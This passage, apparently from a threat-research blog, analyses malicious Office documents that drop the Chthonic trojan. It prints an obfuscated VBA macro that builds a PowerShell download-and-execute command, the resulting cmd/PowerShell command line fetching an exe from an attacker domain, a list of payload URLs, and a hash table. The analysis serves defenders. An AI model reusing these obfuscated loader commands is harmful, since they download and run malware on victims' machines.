						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694cac477fe063970026-1"><span class="crayon-sy">$</span><span class="crayon-v">dr</span><span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-v">kp</span><span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-v">ed</span><span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-v">ipo</span><span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-v">pol</span><span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-v">kos</span><span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-v">lim</span><span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-v">rem</span><span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-v">sad</span><span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-v">hit</span><span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-v">nim</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>The dates were all fairly recent, having been received in the past few days since the beginning of August. The documents shared the same themes for lures but the VBA macro and resulting PowerShell were more along the lines of what I expected.</p>
<p>For sample “538ff577a80748d87b5e738e95c8edd2bd54ea406fe3a75bf452714b17528a87” the following is an excerpt from the VBA macro building the PowerShell command.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694cac47801438103920" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
tntcurier = "$fos=''" + "',''';$hit='df" + "il';$fd=');sta';$dr='(ne';$ed" + "='ject '" + ";$ipo='syst';$kos='t.we';$rem='ent).do';$sad"
tntcurier = tntcurier + "='wn" + "l" + "oa';$kp" + "='w-" + "ob'" + ";$nim='e(''" + "';$mo='" + cautrunova(2) + "';$" + "uy='" + cautrunova(2) + "';$ji" + "='" + cautrunova(2) + ".e" + "x';$po" + "l='em." + "ne';$oe='e''';$jik='rt-p" + "ro';$naw='c" + "ess ''';$lim='bc" + "li';I" + "nv" + "oke-E" + "xp" + "ression($dr+$kp+$ed+$ipo+$pol+$kos+$lim+$rem+$sad+$hit+$nim+'h" + "t" + "t" + "ps:" + "//naiillad." + "dat" + "e/u" + "3." + poro + "xe" + "'+$fos+$mo+$uy+$ji+$oe+$fd+$jik+$naw+$mo+$uy+$ji+$oe)"</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694cac47801438103920-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cac47801438103920-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694cac47801438103920-1"><span class="crayon-v">tntcurier</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"$fos=''"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"',''';$hit='df"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"il';$fd=');sta';$dr='(ne';$ed"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"='ject '"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">";$ipo='syst';$kos='t.we';$rem='ent).do';$sad"</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cac47801438103920-2"><span class="crayon-v">tntcurier</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">tntcurier</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"='wn"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"l"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"oa';$kp"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"='w-"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"ob'"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">";$nim='e(''"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"';$mo='"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-e">cautrunova</span><span class="crayon-sy">(</span><span class="crayon-cn">2</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"';$"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"uy='"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-e">cautrunova</span><span class="crayon-sy">(</span><span class="crayon-cn">2</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"';$ji"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"='"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-e">cautrunova</span><span class="crayon-sy">(</span><span class="crayon-cn">2</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">".e"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"x';$po"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"l='em."</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"ne';$oe='e''';$jik='rt-p"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"ro';$naw='c"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"ess ''';$lim='bc"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"li';I"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"nv"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"oke-E"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"xp"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"ression($dr+$kp+$ed+$ipo+$pol+$kos+$lim+$rem+$sad+$hit+$nim+'h"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"t"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"t"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"ps:"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"//naiillad."</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"dat"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"e/u"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"3."</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-v">poro</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"xe"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"'+$fos+$mo+$uy+$ji+$oe+$fd+$jik+$naw+$mo+$uy+$ji+$oe)"</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0009 seconds] -->
<p>Along with the subsequent Process Activity using the newly built PowerShell command, which aligns with what was commented out of the first sample analyzed.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694cac47803191806243" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
Windows\SysWOW64\cmd.exe , cMD.exe /c "p^Ow^ERS^hel^l^.e^x^e^ -nO^l -No^Ni^Nt^ -W^InDO^ws^ 1 -NoprO^FIle^ -eX^Ec^U B^Ypa^S^s $fos=''',''';$hit='dfil';$fd=');sta';$dr='(ne';$ed='ject ';$ipo='syst';$kos='t.we';$rem='ent).do';$sad='wnloa';$kp='w-ob';$nim='e(''';$mo='tt';$uy='lf';$ji='qo.ex';$pol='em.ne';$oe='e''';$jik='rt-pro';$naw='cess ''';$lim='bcli';Invoke-Expression($dr+$kp+$ed+$ipo+$pol+$kos+$lim+$rem+$sad+$hit+$nim+'https://naiillad[.]date/u3.exe'+$fos+$mo+$uy+$ji+$oe+$fd+$jik+$naw+$mo+$uy+$ji+$oe)"</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694cac47803191806243-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694cac47803191806243-1"><span class="crayon-v">Windows</span><span class="crayon-sy">\</span><span class="crayon-v">SysWOW64</span><span class="crayon-sy">\</span><span class="crayon-v">cmd</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">cMD</span><span class="crayon-sy">.</span><span class="crayon-v">exe</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">c</span><span class="crayon-h"> </span><span class="crayon-s">"p^Ow^ERS^hel^l^.e^x^e^ -nO^l -No^Ni^Nt^ -W^InDO^ws^ 1 -NoprO^FIle^ -eX^Ec^U B^Ypa^S^s $fos=''',''';$hit='dfil';$fd=');sta';$dr='(ne';$ed='ject ';$ipo='syst';$kos='t.we';$rem='ent).do';$sad='wnloa';$kp='w-ob';$nim='e(''';$mo='tt';$uy='lf';$ji='qo.ex';$pol='em.ne';$oe='e''';$jik='rt-pro';$naw='cess ''';$lim='bcli';Invoke-Expression($dr+$kp+$ed+$ipo+$pol+$kos+$lim+$rem+$sad+$hit+$nim+'https://naiillad[.]date/u3.exe'+$fos+$mo+$uy+$ji+$oe+$fd+$jik+$naw+$mo+$uy+$ji+$oe)"</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p>Given this, I iterated over all 171 samples and extracted the following URL’s where PowerShell is downloading a payload.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694cac47805782810328" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
http://ditetec[.]com/ts.exe
http://ditetec[.]com/u2.exe
http://domass[.]com.ua/index.gif
http://firop[.]com/ego.exe
http://unoset[.]com/jpx.exe
http://unoset[.]com/sxr.exe
https://doci[.]download/inc.exe
https://farhenzel[.]co/gls.exe
https://farsonka[.]co/trb.exe
https://formsonat[.]co/mrb.exe
https://fortuma[.]co/scu.exe
https://iilliiill[.]bid/6ven.exe
https://iilliiill[.]bid/ven.exe
https://iilliiill[.]bid/ven.tvv
https://lom[.]party/mov.exe
https://naiillad[.]date/ex3.exe
https://naiillad[.]date/u3.exe
https://naiillad[.]date/vmer.exe
https://naiillad[.]date/vsync.exe
https://notepad-plus-plus[.]org/repository/7.x/7.4.2/npp.7.4.2.Installer.exe
https://prof[.]cricket/wp.exe
https://tvavi[.]win/pago.exe</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694cac47805782810328-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cac47805782810328-2">2</div><div class="crayon-num" data-line="crayon-5f694cac47805782810328-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cac47805782810328-4">4</div><div class="crayon-num" data-line="crayon-5f694cac47805782810328-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cac47805782810328-6">6</div><div class="crayon-num" data-line="crayon-5f694cac47805782810328-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cac47805782810328-8">8</div><div class="crayon-num" data-line="crayon-5f694cac47805782810328-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cac47805782810328-10">10</div><div class="crayon-num" data-line="crayon-5f694cac47805782810328-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cac47805782810328-12">12</div><div class="crayon-num" data-line="crayon-5f694cac47805782810328-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cac47805782810328-14">14</div><div class="crayon-num" data-line="crayon-5f694cac47805782810328-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cac47805782810328-16">16</div><div class="crayon-num" data-line="crayon-5f694cac47805782810328-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cac47805782810328-18">18</div><div class="crayon-num" data-line="crayon-5f694cac47805782810328-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cac47805782810328-20">20</div><div class="crayon-num" data-line="crayon-5f694cac47805782810328-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cac47805782810328-22">22</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694cac47805782810328-1"><span class="crayon-v">http</span><span class="crayon-o">:</span><span class="crayon-c">//ditetec[.]com/ts.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cac47805782810328-2"><span class="crayon-v">http</span><span class="crayon-o">:</span><span class="crayon-c">//ditetec[.]com/u2.exe</span></div><div class="crayon-line" id="crayon-5f694cac47805782810328-3"><span class="crayon-v">http</span><span class="crayon-o">:</span><span class="crayon-c">//domass[.]com.ua/index.gif</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cac47805782810328-4"><span class="crayon-v">http</span><span class="crayon-o">:</span><span class="crayon-c">//firop[.]com/ego.exe</span></div><div class="crayon-line" id="crayon-5f694cac47805782810328-5"><span class="crayon-v">http</span><span class="crayon-o">:</span><span class="crayon-c">//unoset[.]com/jpx.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cac47805782810328-6"><span class="crayon-v">http</span><span class="crayon-o">:</span><span class="crayon-c">//unoset[.]com/sxr.exe</span></div><div class="crayon-line" id="crayon-5f694cac47805782810328-7"><span class="crayon-v">https</span><span class="crayon-o">:</span><span class="crayon-c">//doci[.]download/inc.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cac47805782810328-8"><span class="crayon-v">https</span><span class="crayon-o">:</span><span class="crayon-c">//farhenzel[.]co/gls.exe</span></div><div class="crayon-line" id="crayon-5f694cac47805782810328-9"><span class="crayon-v">https</span><span class="crayon-o">:</span><span class="crayon-c">//farsonka[.]co/trb.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cac47805782810328-10"><span class="crayon-v">https</span><span class="crayon-o">:</span><span class="crayon-c">//formsonat[.]co/mrb.exe</span></div><div class="crayon-line" id="crayon-5f694cac47805782810328-11"><span class="crayon-v">https</span><span class="crayon-o">:</span><span class="crayon-c">//fortuma[.]co/scu.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cac47805782810328-12"><span class="crayon-v">https</span><span class="crayon-o">:</span><span class="crayon-c">//iilliiill[.]bid/6ven.exe</span></div><div class="crayon-line" id="crayon-5f694cac47805782810328-13"><span class="crayon-v">https</span><span class="crayon-o">:</span><span class="crayon-c">//iilliiill[.]bid/ven.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cac47805782810328-14"><span class="crayon-v">https</span><span class="crayon-o">:</span><span class="crayon-c">//iilliiill[.]bid/ven.tvv</span></div><div class="crayon-line" id="crayon-5f694cac47805782810328-15"><span class="crayon-v">https</span><span class="crayon-o">:</span><span class="crayon-c">//lom[.]party/mov.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cac47805782810328-16"><span class="crayon-v">https</span><span class="crayon-o">:</span><span class="crayon-c">//naiillad[.]date/ex3.exe</span></div><div class="crayon-line" id="crayon-5f694cac47805782810328-17"><span class="crayon-v">https</span><span class="crayon-o">:</span><span class="crayon-c">//naiillad[.]date/u3.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cac47805782810328-18"><span class="crayon-v">https</span><span class="crayon-o">:</span><span class="crayon-c">//naiillad[.]date/vmer.exe</span></div><div class="crayon-line" id="crayon-5f694cac47805782810328-19"><span class="crayon-v">https</span><span class="crayon-o">:</span><span class="crayon-c">//naiillad[.]date/vsync.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cac47805782810328-20"><span class="crayon-v">https</span><span class="crayon-o">:</span><span class="crayon-c">//notepad-plus-plus[.]org/repository/7.x/7.4.2/npp.7.4.2.Installer.exe</span></div><div class="crayon-line" id="crayon-5f694cac47805782810328-21"><span class="crayon-v">https</span><span class="crayon-o">:</span><span class="crayon-c">//prof[.]cricket/wp.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cac47805782810328-22"><span class="crayon-v">https</span><span class="crayon-o">:</span><span class="crayon-c">//tvavi[.]win/pago.exe</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0006 seconds] -->
<p></p>
<h3>Pass the Chthonic</h3>
<p>Going back to the Process Activity, we can see the SHA256 value of each downloaded file and compile a list of hashes for further pivoting as shown below.</p>
<p><img class="alignnone size-full wp-image-40249" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_004.png" alt="cht_004" width="1970" height="296" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_004.png 1970w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_004-900x135.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_004-300x45.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_004-768x115.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_004-1024x154.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/08/cht_004-370x56.png 370w" sizes="(max-width: 1970px) 100vw, 1970px" /></p>
<p>After iterating over the 171 samples, we’re left with this list of hashes for the downloaded files. Note that there are fewer payloads than there are samples, indicating many of the documents download the same payload.</p>
<p>Below is a table with the compile date and some PDB strings found within a few of the binaries. Most of the compile times are within the past two months, with 6 in August and a couple from as recently as two days ago at the time of this writing.</p>
<table>
<tbody>
<tr>
<td width="172">SHA256</td>
<td width="93">Compile Date</td>
<td width="178">PDB String</td>
</tr>
<tr>
<td width="172">29c7740f487a461a96fad1c8db3921ccca8cc3e7548d44016da64cf402a475ad</td>
<td width="93">2016-12-10 01</td>
<td width="178"></td>
</tr>
<tr>
<td width="172">d5e56b9b5f52293b209a60c2ccd0ade6c883f9d3ec09571a336a3a4d4c79134b</td>
<td width="93">2016-12-10 03</td>
<td width="178">C:\RAMDrive\Charles\heaven\reams\Teac.pdb</td>
</tr>
<tr>
<td width="172">dd5f237153856d19cf20e80ff8238ca42047113c44fae27b5c3ad00be2755eea</td>
<td width="93">2016-12-10 16</td>
<td width="178">C:\Cleaner\amuse\rang\AutoPopulate\la.pdb</td>
</tr>
<tr>
<td width="172">a5001e9b29078f532b1a094c8c16226d20c03922e37a4fca2e9172350bc160a0</td>
<td width="93">2016-12-20 18</td>
<td width="178"></td>
</tr>
<tr>
<td width="172">8284ec768a06b606044defe2c2da708ca6b3b51f8e58cb66f61bfca56157bc88</td>
<td width="93">2017-07-05 10</td>
<td width="178"></td>
</tr>
<tr>
<td width="172">f0ce51eb0e6c33fdb8e1ccb36b9f42139c1dfc58d243195aedc869c7551a5f89</td>
<td width="93">2017-07-09 20</td>
<td width="178">C:\TableAdapter\encyclopedia\Parik.pdb</td>
</tr>
<tr>
<td width="172">145d47f4c79206c6c9f74b0ab76c33ad0fd40ac6724b4fac6f06afec47b307c6</td>
<td width="93">2017-07-10 08</td>
<td width="178">C:\ayakhnin\reprductive\distortedc.pdb</td>
</tr>
<tr>
<td width="172">dc8f34829d5fede991b478cf9117fb18c32d639573a827227b2fc50f0b475085</td>
<td width="93">2017-07-11 01</td>
<td width="178">C:\positioning\scrapping\Szets\thi.pdb</td>
</tr>
<tr>
<td width="172">7fe1069c118611113b4e34685e7ee58cb469bda4aa66a22db10842c95f332c77</td>
<td width="93">2017-07-11 02</td>
<td width="178">C:\NeXT\volatile\legacyExchangeDNs.pdb</td>
</tr>
<tr>
<td width="172">5edf117e7f8cd176b1efd0b5fd40c6cd530699e7a280c5c7113d06e9c21d6976</td>
<td width="93">2017-07-12 23</td>
<td width="178"></td>
</tr>
<tr>
<td width="172">2a80fdda87127bdc56fd35c3e04eb64a01a159b7b574177e2e346439c97b770a</td>
<td width="93">2017-07-13 00</td>
<td width="178"></td>
</tr>
<tr>
<td width="172">a9021e253ae52122cbcc2284b88270ceda8ad9647515d6cca96db264a76583f5</td>
<td width="93">2017-07-18 00</td>
<td width="178"></td>
</tr>
<tr>
<td width="172">dd639d76ff6f33bbfaf3bd398056cf4e95e27822bd9476340c7703f5b38e0183</td>
<td width="93">2017-07-18 00</td>
<td width="178"></td>
</tr>
<tr>
<td width="172">e5a00b49d4ab3e5a3a8f60278b9295f3d252e3e04dadec2624bb4dcb2eb0fada</td>
<td width="93">2017-07-24 17</td>
<td width="178"></td>
</tr>
<tr>
<td width="172">6263730ef54fbed0c2d3a7c6106b6e8b12a6b2855a03e7caa8fb184ed1eabeb2</td>
<td width="93">2017-07-24 22</td>
<td width="178">C:\Snapshot\Diskette\hiding\ROCKMA.pdb</td>
</tr>
<tr>
<td width="172">43bfaf9a2a4d46695bb313a32d88586c510d040844f29852c755845a5a09d9df</td>
<td width="93">2017-07-25 06</td>
<td width="178"></td>
</tr>
<tr>
<td width="172">b41660db6dcb0d3c7b17f98eae3141924c8c0ee980501ce541b42dc766f85628</td>
<td width="93">2017-07-25 06</td>
<td width="178">C:\mdb\Changed\Container\praise.pdb</td>
</tr>
<tr>
<td width="172">9acdad02ca8ded6043ab52b4a7fb2baac3a08c9f978ce9da2eb51c816a9e7a2e</td>
<td width="93">2017-07-25 07</td>
<td width="178"></td>
</tr>
<tr>
<td width="172">2ddaa30ba3c3e625e21eb7ce7b93671ad53326ef8b6e2bc20bc0d2de72a3929d</td>
<td width="93">2017-07-25 20</td>
<td width="178">C:\helpers\better\Expr\Eight\DS.pdb</td>
</tr>
<tr>
<td width="172">b836576877b2fcb3cacec370e5e6a029431f59d5070da89d94200619641ca0c4</td>
<td width="93">2017-07-26 12</td>
<td width="178">C:\V\regard\violates\update\AMBW\a.pdb</td>
</tr>
<tr>
<td width="172">0972fc9602b00595e1022d9cfe7e9c9530d4e9adb5786fea830324b3f7ff4448</td>
<td width="93">2017-07-26 20</td>
<td width="178"></td>
</tr>
<tr>
<td width="172">2c258ac862d5e31d8921b64cfa7e5a9cd95cca5643c9d51db4c2fcbe75fa957a</td>
<td width="93">2017-07-27 01</td>
<td width="178">C:\executablery\constructed\IIc.pdb</td>
</tr>
<tr>
<td width="172">dd9c558ba58ac81a2142ecb308ac8d0f044c7059a039d2e367024d953cd14a00</td>
<td width="93">2017-07-27 02</td>
<td width="178"></td>
</tr>
<tr>
<td width="172">cb3173a820ac392005de650bbd1dd24543a91e72d4d56300a7795e887a8323b2</td>
<td width="93">2017-07-31 14</td>
<td width="178">C:\letterbxing\EVP\Chices\legit.pdb</td>
</tr>
<tr>
<td width="172">a636f49814ea6603534f780b83a5d0388f5a5d0eb848901e1e1bf2d19dd84f05</td>
<td width="93">2017-07-31 18</td>
<td width="178">C:\Biomuse\moment\705\cnvincing.pdb</td>
</tr>
<tr>
<td width="172">677dd11912a0f13311d025f88caabeeeb1bda27c7c1b5c78cffca36de46e8560</td>
<td width="93">2017-07-31 21</td>
<td width="178"></td>
</tr>
<tr>
<td width="172">fdedf0f90d42d3779b07951d1e8826c7015b3f3e724ab89e350c9608e1f23852</td>
<td width="93">2017-08-01 21</td>
<td width="178"></td>
</tr>
<tr>
<td width="172">142bf7f47bfbd592583fbcfa22a25462df13da46451b17bb984d50ade68a5b17</td>
<td width="93">2017-08-02 09</td>
<td width="178"></td>
</tr>
<tr>
<td width="172">6f4b2c95b1a0f320da1b1eaa918c338c0bab5cddabe169f12ee734243ed8bba8</td>
<td width="93">2017-08-02 12</td>
<td width="178">C:\cataloging\Dr\VarianceShadows11.pdb</td>
</tr>
<tr>
<td width="172">fd5fd7058cf157ea249d4dcba71331f0041b7cf8fd635f37ad13aed1b06bebf2</td>
<td width="93">2017-08-04 02</td>
<td width="178">C:\dumplings\That\BIT\Warez\loc.pdb</td>
</tr>
<tr>
